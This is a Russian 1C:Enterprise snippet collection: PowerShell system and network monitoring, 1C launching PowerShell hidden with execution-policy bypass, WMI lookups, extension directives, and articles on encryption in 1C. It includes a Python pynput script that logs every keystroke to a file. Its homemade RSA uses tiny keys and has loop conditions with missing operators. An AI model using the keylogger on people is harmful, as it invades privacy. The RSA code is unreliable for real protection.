$memtotal = Get-WmiObject -Class win32_OperatingSystem -ComputerName $scripthost; 
$memtotal | Format-List $fieldPercentage,$fieldfreeram,$fieldtotalram,$fieldfreeVram,$fieldtotalVram;

+++
get-wmiobject WIN32_PROCESS | Sort-Object -Property ws -Descending|select -first 10|Select processname, @{Name=""Mem Usage(MB)"";Expression={[math]::round($_.ws / 1mb)}},@{Name=""ProcessID"";Expression={[String]$_.ProcessID}},@{Name=""UserID"";Expression={$_.getowner().user}} | Format-Table

++
get-process -computername $tag1 | Group-Object -Property ProcessName | Format-Table Name, @{n='Mem (KB)';e={'{0:N0}' -f (($_.Group|Measure-Object WorkingSet -Sum).Sum / 1KB)};a='right'} -AutoSize
	
"}
},
{0,
{"Сетевая активность",0,0,"","$NetworkInterfaces = [System.Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces()
$list = new-object 'System.Collections.Generic.List[System.Object]'
foreach ($NetworkInterface in $NetworkInterfaces)
{
	
	$NetworkInterfaceBytesSent = $NetworkInterface.GetIPv4Statistics().BytesSent
	$NetworkInterfaceBytesReceived = $NetworkInterface.GetIPv4Statistics().BytesReceived
	$NetworkInterfaceBytesTotal = $NetworkInterfaceBytesSent + $NetworkInterfaceBytesReceived
	if (-Not $NetworkInterfaceBytesTotal -eq 0)
	{
		$objNetworkInterfaceInfo = New-Object System.Object
	    $objNetworkInterfaceInfo | Add-Member -MemberType NoteProperty -Name Id -Value $NetworkInterface.Id
		$objNetworkInterfaceInfo | Add-Member -MemberType NoteProperty -Name Name -Value $NetworkInterface.Name
		$objNetworkInterfaceInfo | Add-Member -MemberType NoteProperty -Name NetworkInterfaceBytesSent -Value $NetworkInterfaceBytesSent
		$objNetworkInterfaceInfo | Add-Member -MemberType NoteProperty -Name NetworkInterfaceBytesReceived -Value $NetworkInterfaceBytesReceived

		$objNetworkInterfaceInfo
		$list.Add($objNetworkInterfaceInfo)
	}
}
$list | ConvertTo-Json
#$list.ToArray()"}
},
{0,
{"| Format-Table",0,0,"","Иногда может не записывать таблицу в файл, хотя в выводе в консоль она будет, тогда надо в создание таблицы дописывать "" | Format-Table"".
Например, 
get-wmiobject WIN32_PROCESS | Sort-Object -Property ws -Descending|select -first 10|Select processname, @{Name=""Mem Usage(MB)"";Expression={[math]::round($_.ws / 1mb)}},@{Name=""ProcessID"";Expression={[String]$_.ProcessID}},@{Name=""UserID"";Expression={$_.getowner().user}} | Format-Table"}
},
{0,
{"Получить сетевую активность полученных и отправленных байтов (network activity bytes send and receive)",0,0,"","ms windows network activity bytes send and receive in command line

+++
In Powershell:

$computer 	= ""LocalHost""
$namespace 	= ""root\CIMV2""
$Tcpip_NI 	= Get-WmiObject -class Win32_PerfRawData_Tcpip_NetworkInterface -computername $computer -namespace $namespace
$Tcpip_NI | Select BytesReceivedPersec,BytesSentPersec,BytesTotalPersec | Format-Table

In cmd line using just wmic:

wmic path Win32_PerfRawData_Tcpip_NetworkInterface Get BytesReceivedPersec,BytesSentPersec,BytesTotalPersec

++
$ifIndex 	= Get-WmiObject -Class win32_ip4routetable | where {$_.destination -eq ""0.0.0.0""} | select -ExpandProperty InterfaceIndex
$ifIndex 	= ""InterfaceIndex="" + $ifIndex
$nic_name 	= Get-WmiObject -Class win32_networkadapterconfiguration -Filter $ifIndex | select -ExpandProperty Description
$nic 		= [System.Net.NetworkInformation.Networkinterface]::GetAllNetworkInterfaces() | where {($_.description -eq $nic_name) -and ($_.operationalstatus -eq ""up"")}
$stats 		= $nic.GetIPv4Statistics()
$bytesSent 	= $stats.BytesSent
$bytesReceived = $stats.BytesReceived
$ifIndex
$nic_name
$nic
$stats
$bytesSent
$bytesReceived
+
[System.Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces() | ForEach-Object {$_.Id $_.Name $_.GetIPv4Statistics()}

Информация о устройстве
PowerShell snippet to detect ethernet network speed in Windows
An easy to use PowerShell snippet to detect ethernet network speed in Windows Server (Core & Nano including) is:

wmic NIC where ""NetEnabled='true'"" get ""Name,Speed""
This prints out the name of the interface and configured speed, like:

PS C:\Users\janr> wmic NIC where ""NetEnabled='true'"" get ""Name,Speed""
Name                                    Speed
Broadcom NetXtreme Gigabit Ethernet #2  1000000000
You can also easily get the network adapter’s MAC address using:

wmic NIC where ""NetEnabled='true'"" get MACAddress
Did you know you can list all Hyper-V virtual machines MAC addresses easily with PowerShell?

That was easy, now wasn’t it?!  Of course you can also use PowerShell’s Get-NetAdapter cmdlet. The Get-NetAdapter cmdlet gets the basic network adapter properties, like:

PS C:\> (Get-NetAdapter -Name Ethernet).LinkSpeed
1 Gbps
You can lookup the available interfaces and its names with (Get-NetAdapter).Name

Get-WmiObject win32_networkadapterconfiguration `
| Select-Object -Property @{name='IPAddress';Expression={($_.IPAddress[0])}},MacAddress `
| Where IPAddress -NE $null"}
},
{0,
{"Сохранить и прочитать файл в 1С через PowerShell (WScript.Shell, Run)",0,0,"","ObjShell 		= Новый COMОбъект(""WScript.Shell"");
ПутьКФайлу 		= ПолучитьИмяВременногоФайла(""txt"");
Script 			= ПолучитьСкриптPowerShell(ПутьКФайлу);
ObjScriptRun 	= ObjShell.Run(""Powershell.exe -windowstyle hidden -Executionpolicy Bypass -nologo -noninteractive -comand "" + Script, 0, True);

ТекстовыйФайл.Прочитать(ПутьКФайлу);
лРезультатПроцессы 	= ТекстовыйФайл.ПолучитьТекст();

Файл 		= Новый Файл(ПутьКФайлу);
Если Файл.Существует() Тогда
	УдалитьФайлы(ПутьКФайлу);
КонецЕсли;"}
},
{0,
{"Шифрование Base64",0,0,"","doskey btoa=powershell ""[convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(\""$*\""))""
doskey atob=powershell ""[Text.Encoding]::UTF8.GetString([convert]::FromBase64String(\""$*\""))""

btoa Hello world!
btoa This is fun.
btoa wheeeeee!
atob SGVsbG8gd29ybGQh"}
},
{0,
{"Уведомление в область уведомлений",0,0,"","[void] [System.Reflection.Assembly]::LoadWithPartialName(""System.Windows.Forms"")

$objNotifyIcon 					= New-Object System.Windows.Forms.NotifyIcon 

$objNotifyIcon.Icon 			= ""C:\ICO\Справочник.ico""
$objNotifyIcon.BalloonTipIcon 	= ""Error"" 
$objNotifyIcon.BalloonTipText 	= ""Содержание сообщения"" 
$objNotifyIcon.BalloonTipTitle 	= ""Заголовок сообщения""

$objNotifyIcon.Visible 			= $True 
$objNotifyIcon.ShowBalloonTip(10000)"}
},
{2,
{"IP",1,0,"",""},
{0,
{"""пингуется"" ли указанный IP (через winmgmts, Win32_PingStatus, vbs)",0,0,"","Вариант №1: 
// Функция Avaible проверяет ""пингуется"" ли указанный IP
Function Avaible(IP) Export
	Try
		ServicesSet = GetCOMObject(""winmgmts:{impersonationLevel=impersonate}"");
		Items = ServicesSet.ExecQuery(""SELECT StatusCode from Win32_PingStatus WHERE address = '"" + IP + ""' AND Timeout=3"");
	Except
		Return Undefined;
	EndTry;
	For Each Item In Items Do
		If Item.StatusCode = 0 Then
			Return True;
		Else
			Return False;
		EndIf;
	EndDo;
EndFunction // Avaible()

Вариант №2: 
Function Avaible_2(IP) Export
	scrptCtrl = New COMObject(""MSScriptControl.ScriptControl"");
	scrptCtrl.language = ""vbscript"";
	scrptCtrl.addcode(""
	|Function Avaible()
	|Set objWMIService = GetObject(""""winmgmts:{impersonationLevel=impersonate}"""")
	|Set objPing = objWMIService.ExecQuery(""""select * from Win32_PingStatus where address = '"" + IP + ""'"""")
	|For Each objStatus in objPing
	|If IsNull(objStatus.StatusCode) Or objStatus.StatusCode <> 0 Then
	|   Avaible = 0
	|Else
	|   Avaible = 1
	|End If
	|Next
	|End function
	|"");
	Return ScrptCtrl.Run(""Avaible"");
EndFunction // Avaible_2()"}
},
{0,
{"IP (через winmgmts, Win32_NetworkAdapterConfiguration)",0,0,"","strComputer = "".""; 
objWMIService = ПолучитьCOMОбъект(""winmgmts:\\"" + strComputer + ""\root\CIMV2""); 
colItems = objWMIService.ExecQuery(""Select * from Win32_NetworkAdapterConfiguration Where IPEnabled=TRUE"",,48); 
Для Каждого objItem Из colItems Цикл 
	Сообщить(""----------------------------------- ""); 
	Сообщить(""Win32_NetworkAdapterConfiguration""); 
	Сообщить(""----------------------------------- ""); 
	Для Каждого Стр Из objItem.IPAddress Цикл 
		Сообщить(""IPAddress: "" + Стр); 
	КонецЦикла; 
КонецЦикла; "}
}
}
},
{1,
{"Python",1,0,"",""},
{2,
{"pynput",1,0,"",""},
{0,
{"Клики мышью в лог (pynput.mouse, logging)",0,0,"","from pynput.mouse import Listener
from datetime import datetime
import logging

logging.basicConfig(filename=datetime.now().strftime('MouseLog_%Y_%m_%d.log'), level=logging.DEBUG, format=""%(asctime)s\t%(msecs)03d\t%(message)s"", datefmt='%Y-%m-%d %H:%M:%S')

#def on_move(x, y):
#	logging.info(""Mouse moved	{0}	{1}"".format(x, y))

def on_click(x, y, button, pressed):
	if pressed:
		if str(button) == ""Button.left"":
			buttonStr = ""0""
		elif str(button) == ""Button.right"":
			buttonStr = ""1""
		else:
			buttonStr = ""2""
		
		logging.info('{0}\t{1}\t{2}'.format(x, y, buttonStr))

#def on_scroll(x, y, dx, dy):
#    logging.info('Mouse scrolled	{0}	{1}	{2}	{3}'.format(x, y, dx, dy))

#with Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
with Listener(on_click=on_click) as listener:
	listener.join()"}
},
{0,
{"Клавиши в лог (pynput.keyboard, logging)",0,0,"","from pynput.keyboard import Key, Listener
from datetime import datetime
import logging

logging.basicConfig(filename=datetime.now().strftime('KeyLog_%Y_%m_%d.log'), level=logging.DEBUG, format=""%(asctime)s\t%(msecs)03d\t%(message)s"", datefmt='%Y%m%d%H%M%S')

def on_press(key):
	try:
		KeyStr = '{0}'.format(key.char)
	except:
		KeyStr = '{0}'.format(key)
		
	logging.info('{0}'.format(KeyStr))

with Listener(on_press=on_press) as listener:
	listener.join()"}
}
}
},
{8,
{"Директивы расширения (Перед, Вместо, После, ИзменениеИКонтроль)",1,0,"",""},
{0,
{"Директива расширения",0,0,"расш[ирение]","&<?"""", ВыборВарианта, ""Перед"", ""Перед"", ""Вместо"", ""Вместо"", ""После"", ""После"", ""ИзменениеИКонтроль"", ""ИзменениеИКонтроль"">(""<?""Название метода"">"")"}
},
{0,
{"Директива расширения Перед",0,0,"расшПе[ре]","&Перед(""<?""Название метода"">"")"}
},
{0,
{"Директива расширения Перед",0,0,"расшПо[сле]","&После(""<?""Название метода"">"")"}
},
{0,
{"Директива расширения Вместо",0,0,"расшВ[мес]","&Вместо(""<?""Название метода"">"")"}
},
{0,
{"Директива расширения ИзменениеИКонтроль",0,0,"расшИ[зм]","&ИзменениеИКонтроль(""<?""Название метода"">"")"}
},
{0,
{"Директива расширения Удаление",0,0,"расшУдал[ит]","#Удаление
<?>
#КонецУдаления"}
},
{0,
{"Директива расширения Вставка",0,0,"расшВст[авит]","#Вставка
<?>
#КонецВставки"}
},
{0,
{"Директива расширения Заменить",0,0,"расшЗам[ен]","#Удаление

#КонецУдаления
#Вставка
<?>
#КонецВставки"}
}
},
{11,
{"Шифрование",1,0,"",""},
{0,
{"Шифрование в 1С (большая статья)",0,0,"","Шифрование в 1С
При выборе метода шифрования необходимо исходить из правила - «Если стоимость взлома алгоритма выше, чем стоимость зашифрованных данных, вы,
скорее всего, в безопасности»
Брюс Шнайер. 
НЕМНОГО ТЕОРИИ
Существует два метода шифрования:

Симметричное шифрование - использует один и тот же ключ и для шифрования, и для дешифрования. Основная проблема этого метода заключается в том, что если вы хотите передать зашифрованное сообщение, то должны передать и ключ, который можно при передаче скомпрометировать.

Асимметричное шифрование - использует два разных ключа: один для шифрования (который также называется открытым), другой для дешифрования (называется
закрытым). Этот метод лишен недостатка предыдущего. Открытый ключ можно передать по открытым каналам.

Электронная цифровая подпись (ЭЦП) – это разновидность асимметричного шифрования, когда документ подписывается закрытым ключом, а достоверность документа проверяется открытым.
Хотя в реальности это выглядит несколько сложнее. Хэш-функцией создается хэш документа, который и подписывается закрытым ключом. Далее, эта подпись добавляется к документу.
При проверке подписи, хэш-функцией создается хэш проверяемого документа. Подпись, присоединенная при подписи, дешифруется открытым ключом. Сравниваются два хэша, если они равны, то все в порядке.

Сертификат безопасности – если упростить до предела, сертификат безопасности и является тем самым открытым ключом с дополнительной информацией. Обычно,
сертификаты располагаются в базах данных центров сертификации, которые и формируют из открытого ключа, сертификат. Эти центры отвечают за достоверность сертификатов.
На практике, если вы получили документ, подписанный ЭЦП, и хотите проверить подлинность подписи, необходимо проверить сертификат в центре сертификации и, если он действительно принадлежит отправителю и не просрочен, проверить целостность документа.
При отправке шифрованного сообщения, получаете сертификат получателя в центре, зашифруете сообщение открытым ключом из сертификата и отправляете получателю.
Поскольку создание сертификата и размещение в базе данных дело платное, можно создать временный сертификат. Это сертификат, который не удостоверен в центре сертификации, и его достоверность не может быть подтверждена кроме как вашим словом.
Каждая локальная машина под управлением любой ОС имеет свою локальную базу сертификатов. В Windows для просмотра сертификатов достаточно запустить консоль управления набрав в командной строке certmgr.msc, в Linux можно использовать апплет шифрования оболочки, хотя там возможностей больше.
Обычно сертификаты попадают в эту базу автоматически, когда используется шифрованное соединение вроде SSL, VPN и др., однако временный сертификат необходимо добавлять в ручную.

Криптопровайдер – из названия понятно, что это набор программных средств управляющих всем, что связанно с криптографией. Создание сертификатов, проверка сертификатов в центрах сертификации, шифрование, дешифрование и пр.

МЕТОДЫ ШИФРОВАНИЯ
В 1С возможны три варианта с помощью которых можно шифровать данные:

Шифрование методом встроенного объекта «МенеджерКриптографии».
Шифрование с использованием внешних компонент.
Шифрование непосредственно в 1С.
ШИФРОВАНИЕ МЕТОДОМ ВСТРОЕННОГО ОБЪЕКТА «МенеджерКриптографии».
Этот метод достаточно подробно описан в Синтакс-Помощнике. Поэтому я опишу только последовательность работы с ним.
Создаем объект МенеджерКриптографии.


Где ""Microsoft Enhanced Cryptographic Provider v1.0"" и есть тот самый криптопровайдер, а ""1"" тип который можно посмотреть в реестре.


Дальше еще проще, получаем из менеджера криптографии, хранилище сертификатов. Из хранилища получаем нужный сертификат.
При выборе сертификата лучше использовать серийный номер, так как он короче отпечатка, меньше вероятность ошибки. Поиск по наименованию субъекта необходимо делать с осторожностью, так как при создании нескольких сертификатов одним владельцем, наименования субъекта могут быть одинаковыми.
После того как сертификат получен, зашифровываем, дешифровываем, подписываем, проверяем подпись, в общем делаем все что необходимо.
В интернете имеются реализации, когда сертификат записывают в регистр, а оттуда извлекают их при необходимости. Проблема заключается в том, что все сертификаты имеют срок действия, и к тому же они могут быть перевыпущены в любой момент, в случае, когда закрытые ключи утеряны или скомпрометированы. Эти изменения придется отслеживать вручную.

ШИФРОВАНИЕ С ИСПОЛЬЗОВАНИЕМ ВНЕШНИХ КОМПОНЕНТ
Использование внешних компонент зависит от опыта и прихоти программиста. Есть множество бесплатных и платных реализаций.
Каждая из таких реализаций предусматривает наличие собственных методов управления ключами и алгоритмами шифрования, поэтому описывать хотя бы некоторые из них не имеет никакого смысла, так как каждый выберет реализацию по душе.
В качестве единственного примера реализации предлагаю статью «Шифрование
и защита информации в 1С:Предприятие 7.7/8.0/8.1/8.2», так как она использует широко распространённую платформу .Net Framework, в которой можно реализовать шифрование множеством алгоритмов.

ШИФРОВАНИЕ НЕПОСРЕДСТВЕННО В 1С
Чаще всего, бывают случаи, когда «танцы с бубнами» вокруг сертификатов абсолютно не нужны. Никто не будет заморачиваться покупкой сертификатов, а создание и отслеживание временных сертификатов, только добавляет «головной боли» программисту. К тому же необходимо всего лишь передать ведомость по зарплате в филиал или в документообороте создать персональную служебную записку.
Для этого можно реализовать достаточно надежный для этих целей алгоритм шифрования на встроенном языке.
Основными ограничениями в этом случае являются отсутствие в 1С методов для работы с двоичными данными и производительность платформы.
Обойти ограничения отсутствия методов двоичного счисления можно применив для работы алгоритма обычную десятичную математику.
С производительностью, к сожалению, ничего сделать нельзя. Все попытки существенно увеличить производительность при шифровании и дешифровании не привели к успеху, натыкаясь на ограничения платформы.

RSA для 1С
С теорией алгоритма RSA можно познакомиться здесь.
Основываясь именно на этом материале был реализован программный код состоящий всего из шести небольших функций.

// Функция проверяет является ли проверяемое число простым.
// Тест простоты (Перебор делителей).
// Параметры:
// 	- натуральное число.
// Возврат:
// 	- ИСТИНА - если число является простым.
&НаСервере
Функция ТестПростоты(ЧислоДляПроверки)
	Индекс = 2;
	Признак = 0;
	Пока ((Индекс * Индекс)  1) Цикл 
		ЦелаяЧасть = Цел(ЧислоДляПроверки/Индекс);
		Если (ЧислоДляПроверки/Индекс - ЦелаяЧасть) = 0 Тогда 
			Признак = 1;
		КонецЕсли;
		Индекс = Индекс + 1;
	КонецЦикла;
	Если Признак = 1 Тогда
		Возврат Ложь;
	Иначе
		Возврат Истина;
	КонецЕсли;
КонецФункции
// Функция возвращает случайное простое число в заданном диапазоне.
// Параметры:
// 	- НижнийДиапазон - нижняя граница диапазона;
// 	- ВерхнийДиапазон - верхняя граница диапазона.
// Возврат:
// 	- случайное простое число.
&НаСервере
Функция ПолучитьПростоеЧисло(НижнийДиапазон, ВерхнийДиапазон, ЧислоИнициации)
	ГСЧ = Новый ГенераторСлучайныхЧисел(ЧислоИнициации);
	СлучайноеЧисло = ГСЧ.СлучайноеЧисло(НижнийДиапазон, ВерхнийДиапазон);
	Пока Не ТестПростоты(СлучайноеЧисло) Цикл 
		СлучайноеЧисло = ГСЧ.СлучайноеЧисло(НижнийДиапазон, ВерхнийДиапазон);
	КонецЦикла;
	ЧислоИнициации = ГСЧ.СлучайноеЧисло(НижнийДиапазон, ВерхнийДиапазон);
	Возврат СлучайноеЧисло;
КонецФункции
// Функция вычисляет взаимно простое число к заданному значению (Алгоритм Евклида).
// Параметры:
// 	- ЧислоОснова - число являющееся основой для поиска взаимно простых чисел.
// 	- ЧислоПоиска - число от которого начинается поиск взаимно простого числа.
// Возврат:
// 	- структура с взаимно простым числом и обратное число по модулю.
&НаСервере
Функция ПолучитьВзаимноПростыеЧисла(ЧислоОснова, ЧислоПоиска) 
	СтруктураВозврата = Новый Структура;
	Пока ЧислоПоиска  0 Цикл
			Частное = Делимое/Делитель;
			Остаток = Делимое - Делитель * Цел(Частное);
			Альфа = АльфаМинус2 - Цел(Частное) * АльфаМинус1;
			Вита = ВитаМинус2 - Цел(Частное) * ВитаМинус1;
			Если Остаток > 0 Тогда
				Делимое = Делитель;
				Делитель = Остаток;
			Иначе
				НаибольшийОбщийДелитель = Делитель;
			КонецЕсли;
			АльфаМинус2 = АльфаМинус1;
			АльфаМинус1 = Альфа;
			ВитаМинус2 = ВитаМинус1;
			ВитаМинус1 = Вита;
		КонецЦикла;
		Если НаибольшийОбщийДелитель = 1 И ВитаМинус2 > 0 Тогда //  
			СтруктураВозврата.Вставить(""НОД"", ЧислоПоиска);
			СтруктураВозврата.Вставить(""Вита"", ВитаМинус2);
			Возврат СтруктураВозврата;
		КонецЕсли;
		ЧислоПоиска = ЧислоПоиска + 1;
	КонецЦикла;
	Возврат ПолучитьВзаимноПростыеЧисла(ЧислоОснова, Цел(ЧислоПоиска/2));
КонецФункции
// Функция формирует закрытый и открытый ключ.
// Возврат:
// 	- структура с набором ключей, открытый-(e, n) и закрытый-(d, n).
&НаСервере
Функция СформироватьКлючи() Экспорт
	// Управление разрядностью ключа
	ВерхняяГраница = 100;
	НижняяГраница = 32;
	ЧислоИнициации = (Год(ТекущаяДата()) + Месяц(ТекущаяДата()) + День(ТекущаяДата()))*(Час(ТекущаяДата())+Минута(ТекущаяДата())+Секунда(ТекущаяДата()));
	// p
	ЧастьПи = ПолучитьПростоеЧисло(НижняяГраница, ВерхняяГраница, ЧислоИнициации);
	// q
	ЧастьКью = ЧастьПи;
	Пока ЧастьКью = ЧастьПи Цикл
		ЧастьКью = ПолучитьПростоеЧисло(НижняяГраница, ВерхняяГраница, ЧислоИнициации);
	КонецЦикла;
	// n
	ЧастьЭн = ЧастьПи * ЧастьКью;
	// Вычисляем функцию Эйлера.
	ЗначениеЭйлера = (ЧастьПи - 1) * (ЧастьКью - 1);
	// Вычисляем случайное взаимно простое чисело.
	ГСЧ = Новый ГенераторСлучайныхЧисел(ЗначениеЭйлера);
	СлучайноеЧисло = ГСЧ.СлучайноеЧисло(1, ЗначениеЭйлера);
	// e, d
	СтруктураЗначений = ПолучитьВзаимноПростыеЧисла(ЗначениеЭйлера, СлучайноеЧисло);
	ЧастьЕ = СтруктураЗначений.НОД;
	ЧастьД = СтруктураЗначений.Вита;
	// Собираем готовые ключи
	СтруктураВозврата = Новый Структура;
	СтруктураКлюча = Новый Структура;
	СтруктураКлюча.Вставить(""ЧастьЕ"", ЧастьЕ);
	СтруктураКлюча.Вставить(""ЧастьЭн"", ЧастьЭн);
	СтруктураВозврата.Вставить(""ОткрытыйКлюч"", ЗначениеВСтрокуВнутр(СтруктураКлюча));
	СтруктураКлюча = Новый Структура;
	СтруктураКлюча.Вставить(""ЧастьЭн"", ЧастьЭн);
	СтруктураКлюча.Вставить(""ЧастьД"", ЧастьД);
	СтруктураВозврата.Вставить(""ЗакрытыйКлюч"", ЗначениеВСтрокуВнутр(СтруктураКлюча));
	Возврат СтруктураВозврата;
КонецФункции
// Функция шифрует текст с использованием открытого ключа.
// Параметры:
// 	- текст подлежащий шифрованию;
// 	- открытый ключ.
// Возврат:
// 	- шифротекст в виде строки чисел через "";"".
&НаСервере
Функция Шифрование(ШифруемыйТекст, ОткрытыйКлюч) Экспорт
	СтрокаВозврата = """";
	СтруктураКлюча = ЗначениеИзСтрокиВнутр(ОткрытыйКлюч);
	Для Индекс = 1 По СтрДлина(ШифруемыйТекст) Цикл
		Код = КодСимвола(ШифруемыйТекст, Индекс);
		Степень = Pow(Код, СтруктураКлюча.ЧастьЕ);
		Шифрокод = Степень - СтруктураКлюча.ЧастьЭн * Цел(Степень / СтруктураКлюча.ЧастьЭн);
		СтрокаВозврата = СтрокаВозврата + Шифрокод + "";""
	КонецЦикла;
	Возврат СтрокаВозврата;
КонецФункции
// Функция дешифрует текст с использованием закрытого ключа.
// Параметры:
// 	- шифротекст;
// 	- закрытый ключ.
// Возврат:
// 	- дешифрованный текст.
&НаСервере
Функция Дешифрование(Шифротекст, ЗакрытыйКлюч) Экспорт
	СтрокаВозврата = """";
	СтруктураКлюча = ЗначениеИзСтрокиВнутр(ЗакрытыйКлюч);
	СтрШифрокод = """";
	Для Индекс = 1 По СтрДлина(Шифротекст) Цикл
		Если Сред(Шифротекст, Индекс, 1) = "";"" Тогда 
			Шифрокод = Число(СтрШифрокод);
			Степень = Pow(Шифрокод, СтруктураКлюча.ЧастьД);
			Код = Степень - СтруктураКлюча.ЧастьЭн * Цел(Степень / СтруктураКлюча.ЧастьЭн);
			СтрокаВозврата = СтрокаВозврата + Символ(Код);
			СтрШифрокод = """";
		Иначе 
			Если Не Сред(Шифротекст, Индекс, 1) = "" "" Тогда
				СтрШифрокод = СтрШифрокод + Сред(Шифротекст, Индекс, 1);
			КонецЕсли;
		КонецЕсли;
	КонецЦикла;
	Возврат СтрокаВозврата;
КонецФункции
Функции расположены в модуле объекта обработки «ОбменСообщениями» из демонстрационного примера |File: demo.zip - Hash: MD5 - 63AF4F485464C863D6B626BAEC44C6C0|.
Демонстрационный пример представляет из себя средство обмена сообщениями между пользователями 1С.


Открытые ключи и содержания сообщений хранятся в базе данных, а закрытые, локально у пользователей. При этом содержание сообщений хранится в регистре в зашифрованном виде.


Алгоритм RSA был разработан еще в 1977 г. В 2003 г. Ади Шамир и Эран Тромер разработали схему устройства TWIRL, которое при стоимости $ 10 000 может дешифровать 512-битный ключ за 10 минут, а при стоимости $ 10 000 000 – 1024-битный ключ меньше, чем за год.
Однако этот алгоритм используется и до настоящего времени с рекомендуемой длинной ключа 2048 бит.
В нашем же случае используется ключ примерно в 14 бит, увеличить длину ключа можно увеличив период диапазона.

// Управление разрядностью ключа
ВерхняяГраница = 100;
НижняяГраница = 32;
Однако значительное увеличение, резко замедляет процесс шифрования и дешифрования."}
},
{0,
{"Симметричное шифрование в 1С",0,0,"","Симметричное шифрование в 1С
Наверно, многие из разработчиков когда-нибудь сталкивались с необходимостью зашифровать данные в 1С. Однажды и я столкнулся с этой проблемой. В сети предлагается множество способов организации шифрования сторонними методами, я же хотел бы рассмотреть шифрование встроенными методами.

В данной статье рассматривается шифрование строк. Разбираемые алгоритмы применимы к любым значениям, которые возможно преобразовать в строку и обратно. Например, таблицу значений можно преобразовать в строку методом ЗначениеВСтрокуВнутр и методом ЗначениеИзСтрокиВнутр получить обратно таблицу значений.

В 1С есть два встроенных варианта использования шифрования:

1. Использование электронной подписи (асимметричное шифрование) имеет сложный механизм применения - в настоящей статье не рассматривается.

2. Использование запароленного zip-архива (симметричное шифрование) - рассматривается в настоящей статье.

Для анализа использования алгоритма приведу примеры универсальных функций, выполняющих шифрование и дешифровку данных (функции выполняются на сервере):

Функция ПолучитьЗашифрованныеДанные(ДанныеШифрования,КлючШифрования,ИдентификаторДанных = ""0"") Экспорт
    
    Попытка
        
        Путь = КаталогВременныхФайлов()+""\""+ИдентификаторДанных;
        ПутьФайла = Путь+"".txt"";
        ПутьАрхива = Путь+"".zip"";
        ЗаписьТекста = Новый ЗаписьТекста(ПутьФайла);
        ЗаписьТекста.Записать(ДанныеШифрования);
        ЗаписьТекста.Закрыть();
        ЗаписьАрхива = Новый ЗаписьZipФайла(ПутьАрхива,КлючШифрования,,,,МетодШифрованияZIP.AES256);
        ЗаписьАрхива.Добавить(ПутьФайла);
        ЗаписьАрхива.Записать();
        ДвоичныеДанные = Новый ДвоичныеДанные(ПутьАрхива);
        ХранилищеДанных = Новый ХранилищеЗначения(ДвоичныеДанные,Новый СжатиеДанных(9));
        УдалитьФайлы(ПутьФайла);
        УдалитьФайлы(ПутьАрхива);
        Возврат ХранилищеДанных;
        
    Исключение
        Возврат Неопределено;
    КонецПопытки; 

КонецФункции

Функция ПолучитьРасшифрованныеДанные(ХранилищеДанных,КлючШифрования,ИдентификаторДанных = ""0"") Экспорт
    
    Попытка
        КаталогСохранения = КаталогВременныхФайлов();
        Путь = КаталогСохранения+""\""+ИдентификаторДанных;
        ПутьАрхива = Путь+"".zip"";
        ХранилищеДанных.Получить().Записать(ПутьАрхива);
        ЧтениеАрхива = Новый ЧтениеZipФайла(ПутьАрхива,КлючШифрования);
        ЭлементАрхива = ЧтениеАрхива.Элементы[0];
        ЧтениеАрхива.Извлечь(ЭлементАрхива,КаталогСохранения);
        ЧтениеАрхива.Закрыть();
        ПутьФайла = КаталогСохранения+""\""+ЭлементАрхива.Имя;
        ЧтениеТекста = Новый ЧтениеТекста(ПутьФайла);
        Данные = ЧтениеТекста.Прочитать();
        ЧтениеТекста.Закрыть();
        УдалитьФайлы(ПутьАрхива);
        УдалитьФайлы(ПутьФайла);
        Возврат Данные;
        
    Исключение
        Возврат Неопределено;
    КонецПопытки; 

КонецФункции

 
Функция ПолучитьЗашифрованныеДанные возвращает хранилище значения с зашифрованными двоичными данными.

Параметры функции:

ДанныеШифрования - Строка для зашифровки;

КлючШифрования - Ключ симметричного шифрования (пароль zip-архива);

ИдентификаторДанных - Строка - Произвольное идентификационное значение (необязательный параметр)

Механизм шифрования заключается в следующей последовательности действий:

Шифруемая строка записывается в текстовый файл
Текстовый файл помещается в архив с паролем (метод шифрования можно выбрать, в данном случае используется AES-256)
Записанный архив в зашифрованном виде переводится в двоичные данные
Двоичные данные помещаются в хранилище значения, которое возвращается функцией (в дальнейшем, хранилище значения можно поместить в реквизит какого-либо объекта или регистра и хранить в СУБД до появления необходимости в расшифровке)
Созданные файлы удаляются
Функция ПолучитьРасшифрованныеДанные возвращает расшифрованное строковое значение.

Параметры функции:

ХранилищеДанных -Хранилище значения с зашифрованными данными (значение возвращенное функцией ПолучитьЗашифрованныеДанные);

КлючШифрования - Ключ сииметричного шифрования (пароль zip-архива; такой же, как для функции ПолучитьЗашифрованныеДанные);

ИдентификаторДанных - Строка - Произвольное идентификационное значение (необязательный параметр)

Механизм дешифрования заключается в следующей последовательности действий:

Из зашифрованного хранилища значения извлекаются двоичные данные
Двоичные данные записываются в файл (это должен быть зашифрованный zip-архив)
Из zip-архива извлекается текстовый файл с расшифрованным строковым значением
Из текстового файла считывается расшифрованное строковое значение, которое возвращается данной функцией
Созданные файлы удаляются
Изложил свой опыт работы с симметричным шифрованием в 1С.

Надеюсь, будет кому-нибудь полезен."}
},
{0,
{"SHA256 (через MSScriptControl.ScriptControl, JScript)",0,0,"","// Сформируем финансовый токен
ХэшФинансовогоТокена = ""123"";
// Получим хэш финансового токена
ScrptCtrl 			= Новый COMОбъект(""MSScriptControl.ScriptControl"");
ScrptCtrl.Language 	= ""JScript""; 
ScrptCtrl.AddCode(""Текст"");
ХэшФинансовогоТокена 	= ScrptCtrl.Eval(""SHA256('"" + ХэшФинансовогоТокена + ""')"");"}
},
{0,
{"ХешированиеДанных",0,0,"","Хеширование 	= Новый ХешированиеДанных(ХешФункция.SHA256);
Хеширование.Добавить(masterToken + str(operationNum) + usedMethod + login);
financeToken 	= Строка(Хеширование.ХешСумма);"}
},
{0,
{"Шифрование строковых данных. Менеджер криптографии",0,0,"","Шифрование строковых данных. Менеджер криптографии.
Просмотр криптопровайдеров ОС Windows. Инициализация менеджера криптографии.
Шифрование строковых данных с помощью CAPICOM.EnvelopedData
Шифрование строковых данных с помощью CAPICOM.EncryptedData

Шифрование - обратимое преобразование некой информации с целью сокрытия от неавторизованных лиц и, в это же время, предоставление, авторизованным пользователям доступа к ней. Главная задача шифрования - это соблюдение конфиденциальности передаваемой информации.

Методы шифрования:
Симметричное шифрование - использует один и тот же ключ и для зашифрования, и для расшифрования;
